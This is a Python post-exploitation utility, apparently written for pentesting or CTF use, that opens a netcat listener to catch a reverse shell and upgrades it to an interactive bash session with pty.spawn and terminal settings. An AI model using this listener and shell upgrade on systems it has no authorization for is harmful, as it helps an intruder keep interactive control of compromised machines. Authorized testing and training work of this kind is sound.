#!/usr/bin/env python3
# Shell Stabilizer v.20220819
# Requires nc, python3, and pexpect for proper function
# You're welcome. -EtcSec

# This one is WAYYY better than the .sh one

import subprocess
import pexpect as pe
from time import sleep
from sys import argv, stdout

rTimeout = 20   # Response timeout value in seconds
rSleep = 0      # Sleep between commands, is this even needed?

# Grab terminal size
termSize = subprocess.run(['stty','size'], capture_output=True).stdout.decode().strip().split()

# User input validation; requires one valid port number
if len(argv) != 2:
    print("\nUsage: stabalizer.py <port_to_listen_on>\n"); exit(1)
try:
    if int(argv[1]) >= 1 and int(argv[1]) <= 65535:
        listenPort = int(argv[1])
    else:
        print("\nInvalid port number\n"); exit(1)
except ValueError:
    print("\nInvalid port number\n"); exit(1)

print("[-] Listening on port:",listenPort)

def sendCmd(CMD): # Sends command & waits for "token" response
    try:
        rShell.sendline(CMD)
        rShell.expect('Stabilizer> ', timeout=rTimeout)
        sleep(rSleep)
    except:
        print("\nTimeout Reached; or somthing worse??\n")
        exit(1)
    print(".", end='', flush=True)

# Setup ro receive connection via nc
rShell = pe.spawn(f'nc -lvnp {listenPort}')
rShell.expect('received')
print("Future needs incoming IP:Port here...")
print("Attempting stabilization",end='',flush=True)
sleep(1.5) # A little time buffer, just in case

# Begin the stabilization process...
sendCmd('PS1="Stabilizer> "')
sendCmd("""python3 -c 'import pty;pty.spawn("/bin/bash")' && exit""")
sendCmd('PS1="Stabilizer> "')
sendCmd("reset")
sendCmd("export SHELL=bash")
sendCmd("export TERM=xterm-256color")
sendCmd(f"stty rows {termSize[0]} columns {termSize[1]}")
sendCmd(r'PS1="\n\u@\h:\w\n> "')
sendCmd("clear")

# Hopefully that worked, give control back to user
rShell.interact()
